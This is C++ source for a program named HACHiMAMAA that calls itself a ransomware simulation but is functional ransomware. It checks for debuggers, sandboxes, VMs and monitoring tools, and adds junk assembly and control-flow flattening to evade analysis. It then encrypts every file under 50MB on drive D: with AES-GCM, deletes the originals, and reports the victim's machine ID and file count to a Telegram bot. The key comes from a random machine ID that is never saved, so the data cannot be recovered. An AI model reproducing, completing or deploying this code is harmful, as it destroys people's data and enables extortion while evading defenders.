#pragma once

#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <winternl.h>
#include <iostream>
#include <string>
#include <vector>
#include <filesystem>
#include <fstream>
#include <random>
#include <chrono>
#include <thread>
#include <sstream>
#include <iomanip>
#include <cstdlib>

// Thư viện bên ngoài
#include <cryptopp/aes.h>
#include <cryptopp/gcm.h>
#include <cryptopp/osrng.h>
#include <cryptopp/sha.h>
#include <cryptopp/pwdbased.h>
#include <cryptopp/hex.h>
#include <cryptopp/filters.h>
#include <cpr/cpr.h>
#include <nlohmann/json.hpp>

namespace fs = std::filesystem;
using json = nlohmann::json;
namespace CryptoPP {
    class AutoSeededRandomPool;
}

// ---------- OBFUSCATION MACROS ----------
#define JUNK_ASM __asm { xor eax, eax; add eax, 0x12345678; sub eax, 0x12345678; mov eax, 0 }
#define OBFUSCATE_VAR(name) int __##name##_##__LINE__ = 0; __##name##_##__LINE__++

// ---------- OPAQUE PREDICATES ----------
inline bool opaque_true() {
    volatile int x = 0x5F3759DF;
    volatile int y = 0x2B7E1516;
    return ((x * y) ^ 0x12345678) + 0x87654321 > 0;
}
inline bool opaque_false() {
    volatile double a = 42.0;
    volatile double b = a * a + 2 * a + 1;
    return ((int)b % 2 == 1) && (sqrt(b) != (int)(a + 1));
}

// ---------- ANTI-DEBUG ----------
bool IsDbgPresentAdvanced();
bool CheckRemoteDebugger();
bool IsSandboxEnvironment();
bool HasMonitoringTools();

// ---------- FILE SCAN & ENCRYPT ----------
std::vector<std::wstring> ScanTargetFiles(const std::wstring& rootPath, uint64_t maxSizeMB);
std::vector<unsigned char> DeriveKeyFromMachineID(const std::string& machineID);
bool EncryptFileAES_GCM(const std::wstring& filePath, const std::vector<unsigned char>& key);
std::string GenerateMachineID();

// ---------- TELEGRAM ----------
bool SendTelegramMessage(const std::string& botToken, const std::string& chatID, 
                         const std::string& machineID, size_t encryptedCount);
#include "HACHiMAMAA.h"

#pragma comment(lib, "cryptlib.lib")  // Crypto++
#pragma comment(lib, "libcurl.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "psapi.lib")

// ---------- ANTI-ANALYSIS IMPLEMENTATIONS ----------
bool IsDbgPresentAdvanced() {
    JUNK_ASM;
    BOOL isDebugged = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebugged);
    if (isDebugged) return true;

    // PEB BeingDebugged flag
    PPEB pPeb = reinterpret_cast<PPEB>(__readgsqword(0x60));
    if (pPeb->BeingDebugged) return true;

    // NtGlobalFlag
    PDWORD pNtGlobalFlag = reinterpret_cast<PDWORD>(__readgsqword(0x60) + 0xBC);
    if (*pNtGlobalFlag & 0x70) return true;

    return false;
}

bool CheckRemoteDebugger() {
    BOOL debuggerPresent = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &debuggerPresent);
    return debuggerPresent;
}

bool IsSandboxEnvironment() {
    JUNK_ASM;
    // Check hostname
    WCHAR hostname[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerNameW(hostname, &size);
    std::wstring host(hostname);
    for (auto& c : host) c = towlower(c);
    const std::vector<std::wstring> vmIndicators = {
        L"vbox", L"vmware", L"qemu", L"virtual", L"sandbox", L"vmsrvc"
    };
    for (const auto& ind : vmIndicators) {
        if (host.find(ind) != std::wstring::npos) return true;
    }

    // Check RAM (less than 4GB)
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&memInfo);
    if (memInfo.ullTotalPhys < 4ULL * 1024 * 1024 * 1024) return true;

    // Check CPU cores
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors < 2) return true;

    // Check processes for VM tools
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe;
        pe.dwSize = sizeof(PROCESSENTRY32W);
        if (Process32FirstW(snapshot, &pe)) {
            do {
                std::wstring procName(pe.szExeFile);
                for (auto& c : procName) c = towlower(c);
                for (const auto& ind : vmIndicators) {
                    if (procName.find(ind) != std::wstring::npos) {
                        CloseHandle(snapshot);
                        return true;
                    }
                }
            } while (Process32NextW(snapshot, &pe));
        }
        CloseHandle(snapshot);
    }
    return false;
}

bool HasMonitoringTools() {
    const std::vector<std::wstring> suspicious = {
        L"procmon", L"wireshark", L"fiddler", L"regmon", L"filemon", L"processhacker"
    };
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return false;
    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);
    if (Process32FirstW(snapshot, &pe)) {
        do {
            std::wstring procName(pe.szExeFile);
            for (auto& c : procName) c = towlower(c);
            for (const auto& sus : suspicious) {
                if (procName.find(sus) != std::wstring::npos) {
                    CloseHandle(snapshot);
                    return true;
                }
            }
        } while (Process32NextW(snapshot, &pe));
    }
    CloseHandle(snapshot);
    return false;
}

// ---------- UTILS ----------
std::string GenerateMachineID() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 15);
    std::uniform_int_distribution<> dis2(0, 255);
    std::stringstream ss;
    ss << std::hex;
    for (int i = 0; i < 8; ++i) ss << dis(gen);
    ss << "-";
    for (int i = 0; i < 4; ++i) ss << dis(gen);
    ss << "-4"; // version 4
    for (int i = 0; i < 3; ++i) ss << dis(gen);
    ss << "-";
    ss << (8 + dis(gen) % 4);
    for (int i = 0; i < 3; ++i) ss << dis(gen);
    ss << "-";
    for (int i = 0; i < 12; ++i) ss << dis(gen);

    // Add hostname hash for uniqueness
    WCHAR hostname[256];
    DWORD len = 256;
    GetComputerNameW(hostname, &len);
    std::wstring host(hostname);
    std::string hostStr(host.begin(), host.end());
    CryptoPP::SHA256 hash;
    byte digest[CryptoPP::SHA256::DIGESTSIZE];
    hash.CalculateDigest(digest, (const byte*)hostStr.c_str(), hostStr.size());
    std::string hostHash;
    CryptoPP::HexEncoder encoder;
    encoder.Attach(new CryptoPP::StringSink(hostHash));
    encoder.Put(digest, sizeof(digest));
    encoder.MessageEnd();
    return ss.str() + "_" + hostHash.substr(0, 8);
}

std::vector<unsigned char> DeriveKeyFromMachineID(const std::string& machineID) {
    const byte salt[] = "Lab_Salt_2024";
    size_t saltLen = strlen((const char*)salt);
    std::vector<unsigned char> derived(32); // 256-bit key
    CryptoPP::PKCS5_PBKDF2_HMAC<CryptoPP::SHA256> pbkdf2;
    pbkdf2.DeriveKey(derived.data(), derived.size(), 0,
                     (const byte*)machineID.c_str(), machineID.size(),
                     salt, saltLen,
                     100000); // iterations
    return derived;
}

std::vector<std::wstring> ScanTargetFiles(const std::wstring& rootPath, uint64_t maxSizeMB) {
    std::vector<std::wstring> targets;
    uint64_t maxBytes = maxSizeMB * 1024 * 1024;
    try {
        for (const auto& entry : fs::recursive_directory_iterator(rootPath, fs::directory_options::skip_permission_denied)) {
            if (entry.is_regular_file()) {
                std::error_code ec;
                uint64_t size = entry.file_size(ec);
                if (!ec && size > 10 && size < maxBytes) {
                    targets.push_back(entry.path().wstring());
                }
            }
        }
    } catch (...) {}
    return targets;
}

bool EncryptFileAES_GCM(const std::wstring& filePath, const std::vector<unsigned char>& key) {
    using namespace CryptoPP;
    try {
        // Read file
        std::ifstream inFile(filePath, std::ios::binary);
        if (!inFile) return false;
        std::vector<byte> plainData((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
        inFile.close();

        // Generate random nonce (12 bytes for GCM)
        AutoSeededRandomPool rng;
        byte nonce[12];
        rng.GenerateBlock(nonce, sizeof(nonce));

        // Encrypt
        GCM<AES>::Encryption enc;
        enc.SetKeyWithIV(key.data(), key.size(), nonce, sizeof(nonce));
        std::vector<byte> cipherData(plainData.size() + 16); // extra for auth tag
        ArraySink cs(cipherData.data(), cipherData.size());
        ArraySource(plainData.data(), plainData.size(), true,
            new AuthenticatedEncryptionFilter(enc, new Redirector(cs))
        );
        cipherData.resize(cs.TotalPutLength());

        // Write: nonce (12) + ciphertext+tag
        std::wstring newPath = filePath + L".encrypted";
        std::ofstream outFile(newPath, std::ios::binary);
        outFile.write(reinterpret_cast<const char*>(nonce), sizeof(nonce));
        outFile.write(reinterpret_cast<const char*>(cipherData.data()), cipherData.size());
        outFile.close();

        // Delete original
        fs::remove(filePath);
        return true;
    } catch (...) {
        return false;
    }
}

bool SendTelegramMessage(const std::string& botToken, const std::string& chatID,
                         const std::string& machineID, size_t encryptedCount) {
    try {
        std::string url = "https://api.telegram.org/bot" + botToken + "/sendMessage";
        json payload = {
            {"chat_id", chatID},
            {"text", "[ALERT] RANSOMWARE SIMULATION - HACHiMAMAA\nMachine ID: " + machineID +
                     "\nEncrypted Files: " + std::to_string(encryptedCount) +
                     "\nTimestamp: " + [](){
                         auto t = std::time(nullptr);
                         return std::string(std::ctime(&t));
                     }()}
        };
        auto r = cpr::Post(cpr::Url{url}, cpr::Body{payload.dump()}, cpr::Header{{"Content-Type", "application/json"}});
        return r.status_code == 200;
    } catch (...) {
        return false;
    }
}

// ---------- MAIN WITH CONTROL FLOW FLATTENING ----------
int main() {
    // Delay ngẫu nhiên
    std::this_thread::sleep_for(std::chrono::milliseconds(1000 + rand() % 2000));

    // --- MÁY TRẠNG THÁI (Control Flow Flattening) ---
    enum State { START = 0, CHECK1, CHECK2, CHECK3, CHECK4, PROCEED, EXIT };
    State state = START;
    bool shouldExit = false;

    while (true) {
        JUNK_ASM;
        switch (state) {
        case START:
            OBFUSCATE_VAR(start);
            if (opaque_true()) state = CHECK1;
            else state = EXIT;
            break;
        case CHECK1:
            if (IsDbgPresentAdvanced() || CheckRemoteDebugger()) {
                state = EXIT;
            } else {
                state = CHECK2;
            }
            break;
        case CHECK2:
            if (IsSandboxEnvironment()) {
                state = EXIT;
            } else {
                state = CHECK3;
            }
            break;
        case CHECK3:
            if (HasMonitoringTools()) {
                state = EXIT;
            } else {
                state = CHECK4;
            }
            break;
        case CHECK4:
            if (opaque_false()) {
                state = EXIT; // will never happen due to opaque_false
            } else {
                state = PROCEED;
            }
            break;
        case PROCEED:
            goto execute_payload;
        case EXIT:
            shouldExit = true;
            goto execute_payload;
        default:
            shouldExit = true;
            goto execute_payload;
        }
    }

execute_payload:
    if (shouldExit) {
        std::cout << "[!] Debugger/Sandbox detected. Exiting." << std::endl;
        return 0;
    }

    std::cout << "[*] Environment checks passed. HACHiMAMAA starting..." << std::endl;

    // Generate Machine ID
    std::string machineID = GenerateMachineID();
    std::cout << "[*] Machine ID: " << machineID << std::endl;

    // Scan D:\
    std::cout << "[*] Scanning D:\\ for files <50MB..." << std::endl;
    auto files = ScanTargetFiles(L"D:\\", 50);
    std::cout << "[+] Found " << files.size() << " files." << std::endl;
    if (files.empty()) {
        std::cout << "[!] No files to encrypt. Exiting." << std::endl;
        return 0;
    }

    // Derive key
    auto key = DeriveKeyFromMachineID(machineID);

    // Encrypt files
    size_t encrypted = 0;
    for (const auto& f : files) {
        if (EncryptFileAES_GCM(f, key)) {
            encrypted++;
            if (encrypted % 10 == 0) {
                std::cout << "[*] Encrypted " << encrypted << " files..." << std::endl;
                JUNK_ASM;
            }
        }
    }
    std::cout << "[+] Successfully encrypted " << encrypted << " files." << std::endl;

    // Send Telegram
    const std::string BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN";
    const std::string CHAT_ID = "YOUR_CHAT_ID";
    if (BOT_TOKEN != "YOUR_TELEGRAM_BOT_TOKEN") {
        if (SendTelegramMessage(BOT_TOKEN, CHAT_ID, machineID, encrypted)) {
            std::cout << "[+] Telegram notification sent." << std::endl;
        } else {
            std::cout << "[-] Failed to send Telegram message." << std::endl;
        }
    } else {
        std::cout << "[!] Telegram not configured. Skipping." << std::endl;
    }

    std::cout << "[*] Simulation completed." << std::endl;
    return 0;
}